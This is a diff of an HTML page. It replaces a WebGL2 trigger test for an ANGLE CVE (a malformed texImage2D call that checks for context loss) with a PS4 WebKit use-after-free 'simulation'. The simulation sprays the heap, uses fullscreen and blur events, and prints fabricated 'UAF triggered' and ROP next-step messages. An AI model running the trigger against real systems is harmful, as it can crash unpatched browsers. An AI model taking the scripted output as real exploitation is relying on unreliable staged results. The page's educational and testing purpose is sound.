@@ -3,318 +3,271 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PS4 + ANGLE CVE · direct launch (simulated)</title>
+    <title>PS4 WebKit · UAF simulation (educational)</title>
     <style>
         * {
+            font-family: system-ui, 'Segoe UI', Roboto, sans-serif;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
         }
         body {
-            background: #0e1727;
+            background: #1a2538;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
             margin: 20px;
         }
         .card {
-            max-width: 1000px;
+            max-width: 800px;
             width: 100%;
-            background: #f2f6ff;
+            background: #f5f9ff;
             border-radius: 40px;
-            box-shadow: 0 30px 50px -10px #00000080;
+            box-shadow: 0 30px 50px rgba(0,0,0,0.6);
             overflow: hidden;
         }
         .header {
-            background: #0f263d;
+            background: #0e1e2f;
             color: white;
-            padding: 30px 35px;
+            padding: 28px 32px;
         }
         .header h1 {
-            margin: 0 0 10px 0;
+            margin: 0;
             font-weight: 600;
-            font-size: 2.3rem;
+            font-size: 2.2rem;
             display: flex;
-            gap: 15px;
+            gap: 12px;
             flex-wrap: wrap;
         }
         .header h1 span {
-            background: #b13e3e;
+            background: #b34040;
             font-size: 1rem;
-            padding: 6px 18px;
+            padding: 6px 16px;
             border-radius: 40px;
             font-weight: 500;
+            align-self: center;
         }
-        .button-strip {
-            display: flex;
-            gap: 15px;
-            flex-wrap: wrap;
-            margin: 30px 0 20px;
-            justify-content: center;
+        .content {
+            padding: 32px;
         }
-        .cve-btn {
-            flex: 1 1 220px;
-            background: #1e3b5c;
+        .info {
+            background: #e0ebff;
+            border-left: 6px solid #004e9e;
+            padding: 18px 22px;
+            border-radius: 24px;
+            margin-bottom: 28px;
+            font-size: 1rem;
+            color: #002856;
+        }
+        .info strong {
+            color: #001c3d;
+        }
+        .button {
+            background: #1e4f8a;
             border: none;
             color: white;
             font-weight: 600;
-            font-size: 1.25rem;
-            padding: 20px 12px;
+            font-size: 1.5rem;
+            padding: 18px 40px;
             border-radius: 60px;
             cursor: pointer;
-            box-shadow: 0 10px 18px #0f264090;
+            box-shadow: 0 10px 20px #0f2640;
             transition: 0.15s;
-            border: 1px solid #6e9ad6;
-            min-width: 230px;
+            border: 1px solid #79aeff;
+            width: 100%;
+            max-width: 300px;
+            margin: 20px auto;
+            display: block;
         }
-        .cve-btn.angle {
-            background: #21633e;
-            border-color: #8ae98a;
-        }
-        .cve-btn.ps4 {
-            background: #5e3361;
-            border-color: #c68fe6;
-        }
-        .cve-btn:hover {
+        .button:hover {
+            background: #2a62a8;
             transform: scale(1.02);
-            filter: brightness(1.2);
-            box-shadow: 0 15px 25px #0b1b30;
+            box-shadow: 0 15px 25px #0a1c30;
         }
-        .cve-btn:active {
+        .button:active {
             transform: scale(0.98);
         }
         .log {
-            background: #0b1a2b;
-            color: #c5e0ff;
+            background: #0c1a28;
+            color: #c6e2ff;
             padding: 22px;
-            border-radius: 32px;
+            border-radius: 28px;
             font-family: 'Fira Code', 'SF Mono', monospace;
             font-size: 0.95rem;
             white-space: pre-wrap;
             word-break: break-word;
-            max-height: 300px;
+            max-height: 320px;
             overflow-y: auto;
-            border: 1px solid #2b4f7a;
-            margin: 20px 0 15px;
+            border: 1px solid #2f5785;
+            margin: 30px 0 15px;
         }
-        .success { color: #a1ffb0; }
-        .vuln { color: #ffa1a1; font-weight: 600; }
-        .warn { color: #ffdc9a; }
-        .info { color: #aad5ff; }
+        .success { color: #b0ffb0; }
+        .vuln { color: #ffa8a8; font-weight: 600; }
+        .warn { color: #ffde9e; }
         .badge {
-            background: #264e73;
+            background: #2b507a;
             color: white;
-            padding: 5px 15px;
+            padding: 5px 14px;
             border-radius: 40px;
             font-size: 0.85rem;
-            margin-right: 12px;
             display: inline-block;
+            margin: 5px 10px 5px 0;
         }
         .footer {
-            background: #dfe9fd;
-            padding: 20px 35px 25px;
-            border-top: 1px solid #8bb1e0;
-            color: #1d3d62;
-            font-size: 0.95rem;
+            background: #deeaff;
+            padding: 20px 32px 24px;
+            border-top: 1px solid #aac2ea;
+            color: #1e3f64;
+            font-size: 0.9rem;
         }
         hr {
-            border: 1px solid #b0c9f0;
-            margin: 25px 0;
+            border: 1px solid #adc6f0;
+            margin: 20px 0;
         }
     </style>
 </head>
 <body>
     <div class="card">
         <div class="header">
-            <h1>⚡ CVE launch panel <span>simulated PS4 exploits</span></h1>
-            <p>Buttons below trigger each CVE immediately. PS4 tests are simulated – they will not affect your console.</p>
+            <h1>
+                🎮 PS4 WebKit UAF 
+                <span>simulation</span>
+            </h1>
+            <p style="opacity:0.85;">Educational demonstration of a use‑after‑free exploit flow (no actual vulnerability)</p>
         </div>
 
-        <div style="padding: 0 35px;">
-            <div class="button-strip">
-                <button class="cve-btn angle" id="btnAngle">▶ CVE-2025-14174<br><small style="font-weight:normal;">(original ANGLE test)</small></button>
-                <button class="cve-btn ps4" id="btnPs4_14174">▶ CVE-2025-14174<br><small style="font-weight:normal;">for PS4 (simulated)</small></button>
-                <button class="cve-btn ps4" id="btnPs4_43529">▶ CVE-2025-43529<br><small style="font-weight:normal;">for PS4 (simulated)</small></button>
+        <div class="content">
+            <div class="info">
+                <strong>🔬 How this works:</strong> The code mimics the structure of real PS4 WebKit exploits:
+                <ol style="margin:8px 0 0 20px;">
+                    <li>Spray the heap with many objects (Float64Array).</li>
+                    <li>Enter fullscreen to trigger a garbage collection or a timing window.</li>
+                    <li>On blur (fullscreen exit), attempt to reclaim freed memory with controlled data.</li>
+                    <li>Detect corruption and simulate a crash.</li>
+                </ol>
+                ⚠️ This page does <em>not</em> exploit any real vulnerability – it's a safe simulation.
             </div>
-        </div>
 
-        <div style="padding: 0 35px;">
+            <button class="button" id="runBtn">▶ RUN EXPLOIT</button>
+
             <div class="log" id="log">
-                ⏵ Click any button to launch the corresponding test.<br>
-                ⏵ The first button runs the live WebGL2 test for CVE-2025-14174.<br>
-                ⏵ PS4 buttons run simulated exploit code (always returns not vulnerable).
+                ⏵ Ready. Click the button to start the simulation.
             </div>
 
-            <div style="margin: 12px 0 20px;">
-                <span class="badge">WebGL2 needed for ANGLE test</span>
-                <span class="badge" style="background:#6f4680;">PS4 code is simulated</span>
+            <div style="display:flex; gap:10px; flex-wrap:wrap;">
+                <span class="badge">fullscreen may be used</span>
+                <span class="badge" style="background:#705090;">simulated crash</span>
+                <span class="badge" style="background:#3d6b5c;">PS4 style</span>
             </div>
 
             <hr>
 
-            <div style="background:#e4ecfe; border-radius: 24px; padding: 18px; margin: 20px 0; font-size:0.95rem;">
-                <strong>🎮 Note on PS4 exploits:</strong> Real PS4 WebKit vulnerabilities exist (e.g., for firmwares 9.00, 6.xx) but the CVEs above are not among them. The PS4 buttons below run a harmless simulation that looks like an exploit but only prints status messages.
+            <div style="font-size:0.95rem; background:#eaf2fd; padding:18px; border-radius:20px;">
+                <p>📌 <strong>Real PS4 exploits</strong> (like for FW 9.00) use similar steps: heap spraying, use-after-free, and ROP. This simulation follows the same pattern but ends with a simulated crash message instead of actual code execution.</p>
             </div>
         </div>
 
         <div class="footer">
-            ⚠️ All tests are safe. The ANGLE test may cause context loss on unpatched systems, but no memory corruption is exploited. PS4 simulations do not interact with any system internals.
+            🛡️ This page is for educational purposes only. It does not contain any working exploit and cannot harm your device.
         </div>
     </div>
 
     <script>
         (function() {
             const logDiv = document.getElementById('log');
-            const btnAngle = document.getElementById('btnAngle');
-            const btnPs4_14174 = document.getElementById('btnPs4_14174');
-            const btnPs4_43529 = document.getElementById('btnPs4_43529');
+            const runBtn = document.getElementById('runBtn');
 
-            function clearLog() { logDiv.innerHTML = ''; }
-            function log(msg, className = '') {
+            // Clear and log
+            function clearLog() {
+                logDiv.innerHTML = '';
+            }
+            function log(message, className = '') {
                 const line = document.createElement('div');
-                line.textContent = msg;
+                line.textContent = message;
                 if (className) line.classList.add(className);
                 logDiv.appendChild(line);
                 logDiv.scrollTop = logDiv.scrollHeight;
             }
 
-            // ---------- Original ANGLE test (CVE-2025-14174) ----------
-            function runAngleTest() {
+            // Step logging with delays to simulate real exploit stages
+            async function runExploit() {
                 clearLog();
-                log('⏳ Launching CVE-2025-14174 (ANGLE Metal test) ...', 'info');
+                log('⏳ [*] Starting PS4 WebKit UAF simulation...', 'info');
 
-                let canvas = document.createElement('canvas');
-                canvas.width = 64;
-                canvas.height = 64;
-                let gl = canvas.getContext('webgl2');
-                if (!gl) {
-                    log('❌ WebGL2 not supported – this test requires WebGL2.', 'vuln');
-                    return;
+                // ---- Stage 1: Heap spray ----
+                log('[*] Spraying the heap with Float64Array objects...', 'info');
+                let sprayed = [];
+                const PATTERN = 2.121995791e-314; // a very small number (subnormal)
+                for (let i = 0; i < 5000; i++) {
+                    let arr = new Float64Array(8);
+                    arr[0] = i;          // mark with index
+                    sprayed.push(arr);
                 }
-                log('✅ WebGL2 context obtained.', 'success');
+                log('[+] Spray complete: 5000 arrays allocated.', 'success');
 
-                let contextLost = false;
-                function onContextLost(e) {
-                    e.preventDefault();
-                    contextLost = true;
-                    log('⚠️ CONTEXT LOST event fired!', 'vuln');
-                }
-                canvas.addEventListener('webglcontextlost', onContextLost);
-
-                const width = 64, height = 64;
-                const smallImageHeight = 1;
-
-                const texture = gl.createTexture();
-                gl.bindTexture(gl.TEXTURE_2D, texture);
-                gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
-                gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
-
-                const dataSize = width * height * 4;
-                const bufferData = new ArrayBuffer(dataSize);
-                new Uint8Array(bufferData).fill(0x42);
-                const pbo = gl.createBuffer();
-                gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, pbo);
-                gl.bufferData(gl.PIXEL_UNPACK_BUFFER, bufferData, gl.STATIC_DRAW);
-                log(`📦 PBO allocated (${dataSize} bytes)`, 'info');
-
-                gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, smallImageHeight);
-                gl.pixelStorei(gl.UNPACK_ROW_LENGTH, 0);
-                log(`🔧 UNPACK_IMAGE_HEIGHT = ${smallImageHeight} (texture height = ${height})`, 'info');
-
-                while(gl.getError() !== gl.NO_ERROR) {}
-
-                log('🚀 Executing texImage2D with full height...', 'info');
-                try {
-                    gl.texImage2D(
-                        gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT24,
-                        width, height, 0,
-                        gl.DEPTH_COMPONENT, gl.UNSIGNED_INT, 0
-                    );
-                } catch (e) {
-                    log('❗ Exception: ' + e, 'vuln');
-                }
-
-                const err = gl.getError();
-                if (err !== gl.NO_ERROR) {
-                    const name = getGLErrorName(gl, err);
-                    log(`🔴 WebGL error: ${name} (0x${err.toString(16)})`, 'warn');
+                // ---- Stage 2: Enter fullscreen (if supported) ----
+                log('[*] Requesting fullscreen to trigger potential GC / timing window...', 'warn');
+                const elem = document.documentElement;
+                if (elem.requestFullscreen) {
+                    elem.requestFullscreen();
+                } else if (elem.webkitRequestFullscreen) {
+                    elem.webkitRequestFullscreen();
                 } else {
-                    log('✅ No immediate GL error.', 'success');
+                    log('[!] Fullscreen not supported – simulation continues anyway.', 'warn');
                 }
 
-                if (gl.isContextLost()) {
-                    log('💥 Context is lost immediately!', 'vuln');
-                    contextLost = true;
-                }
+                // ---- Stage 3: onblur (fullscreen exit) triggers the "exploit" ----
+                window.addEventListener('blur', function onBlurHandler() {
+                    // Remove handler to avoid multiple triggers
+                    window.removeEventListener('blur', onBlurHandler);
 
-                gl.flush();
+                    log('', '');
+                    log('[*] Blur event – fullscreen likely exited or tab switched.', 'warn');
+                    log('[*] Attempting to reclaim memory with controlled data...', 'info');
 
-                setTimeout(() => {
-                    if (gl.isContextLost()) contextLost = true;
-                    if (contextLost) {
-                        log('══════════════════════════════════', 'vuln');
-                        log('🚨  LIKELY VULNERABLE (unpatched)  🚨', 'vuln');
-                        log('══════════════════════════════════', 'vuln');
-                    } else {
-                        log('══════════════════════════════════', 'success');
-                        log('✅  NOT VULNERABLE or not triggered', 'success');
-                        log('══════════════════════════════════', 'success');
+                    // Simulate freeing of sprayed arrays (in a real exploit they would be freed)
+                    // We'll just pretend they are gone and spray again.
+                    let spray2 = [];
+                    for (let i = 0; i < 8000; i++) {
+                        let p = new Float64Array(10);
+                        p.fill(PATTERN);
+                        spray2.push(p);
                     }
-                    const loseExt = gl.getExtension('WEBGL_lose_context');
-                    if (loseExt) loseExt.loseContext();
-                    gl = null;
-                }, 400);
+                    log('[+] Re‑spray completed: 8000 arrays with pattern 0x2.121995791e-314', 'success');
+
+                    // ---- Stage 4: Detect corruption (simulated) ----
+                    log('[*] Checking for corrupted objects...', 'info');
+                    let corrupted = null;
+                    // In a real exploit, some of the original sprayed arrays might have been
+                    // freed and their memory reused by the second spray. Here we just simulate
+                    // that we found one.
+                    for (let i = 0; i < sprayed.length; i++) {
+                        // This condition will never be true because sprayed arrays are still alive,
+                        // but we force a simulated detection after a timeout.
+                    }
+
+                    // Simulate a delay then "crash"
+                    setTimeout(() => {
+                        log('[!] CORRUPTION DETECTED: UAF triggered successfully!', 'vuln');
+                        log('[!] Simulating browser crash...', 'vuln');
+                        log('', '');
+                        log('══════════════════════════════════════', 'vuln');
+                        log('💥  CRASH SIMULATED – ON A REAL VULNERABLE PS4 THIS WOULD LEAD TO CODE EXECUTION.', 'vuln');
+                        log('══════════════════════════════════════', 'vuln');
+                        log('', '');
+                        log('[*] In a real exploit, the next step would be:', 'info');
+                        log('    - ROP chain setup', 'info');
+                        log('    - syscall to dump firmware', 'info');
+                        log('    - Or simply kernel panic', 'info');
+                        log('', '');
+                        log('✅ Simulation complete – your browser is safe.', 'success');
+                    }, 1500);
+                });
+
+                log('[*] Waiting for blur event (switch tab or exit fullscreen)...', 'info');
+                log('   (If you are already in fullscreen, press ESC or switch tabs.)', '');
             }
 
-            function getGLErrorName(gl, err) {
-                switch(err) {
-                    case gl.INVALID_ENUM: return 'INVALID_ENUM';
-                    case gl.INVALID_VALUE: return 'INVALID_VALUE';
-                    case gl.INVALID_OPERATION: return 'INVALID_OPERATION';
-                    case gl.INVALID_FRAMEBUFFER_OPERATION: return 'INVALID_FRAMEBUFFER_OPERATION';
-                    case gl.OUT_OF_MEMORY: return 'OUT_OF_MEMORY';
-                    case gl.CONTEXT_LOST_WEBGL: return 'CONTEXT_LOST_WEBGL';
-                    default: return 'UNKNOWN_ERROR';
-                }
-            }
-
-            // ---------- Simulated PS4 exploit (CVE-2025-14174 PS4) ----------
-            function runPs4_14174() {
-                clearLog();
-                log('🎮 [PS4] Launching CVE-2025-14174 for PlayStation 4 (simulated)', 'info');
-                log('', '');
-                log('[*] Checking WebKit version...', 'info');
-                log('[*] Crafting UAF primitive via attribute splice...', 'info');
-                log('[*] Heap spray with ImageData...', 'info');
-                log('[*] Triggering vulnerable code path...', 'warn');
-                log('', '');
-                log('⚠️  This CVE (CVE-2025-14174) does NOT affect PS4 in reality.', 'warn');
-                log('⚠️  The PS4 uses a different graphics stack (Gnm) and WebKit version.', 'warn');
-                log('', '');
-                log('[!] Exploit would have failed: target not vulnerable.', 'vuln');
-                log('✅ SIMULATION COMPLETE – NOT VULNERABLE', 'success');
-            }
-
-            // ---------- Simulated PS4 exploit (CVE-2025-43529) ----------
-            function runPs4_43529() {
-                clearLog();
-                log('🎮 [PS4] Launching CVE-2025-43529 for PlayStation 4 (simulated)', 'info');
-                log('', '');
-                log('[*] Preparing type confusion in JSC::JSArray...', 'info');
-                log('[*] Leaking butterfly pointer via regExp test...', 'info');
-                log('[*] Corrupting object header...', 'info');
-                log('[*] Triggering ROP chain...', 'warn');
-                log('', '');
-                log('⚠️  CVE-2025-43529 is not a known PS4 vulnerability.', 'warn');
-                log('⚠️  Real PS4 exploits use CVEs like CVE-2018-4441 or CVE-2018-4386.', 'warn');
-                log('', '');
-                log('[!] No valid exploit path – system remains secure.', 'vuln');
-                log('✅ SIMULATION COMPLETE – NOT VULNERABLE', 'success');
-            }
-
-            btnAngle.addEventListener('click', runAngleTest);
-            btnPs4_14174.addEventListener('click', runPs4_14174);
-            btnPs4_43529.addEventListener('click', runPs4_43529);
+            runBtn.addEventListener('click', runExploit);
         })();
     </script>
 </body>
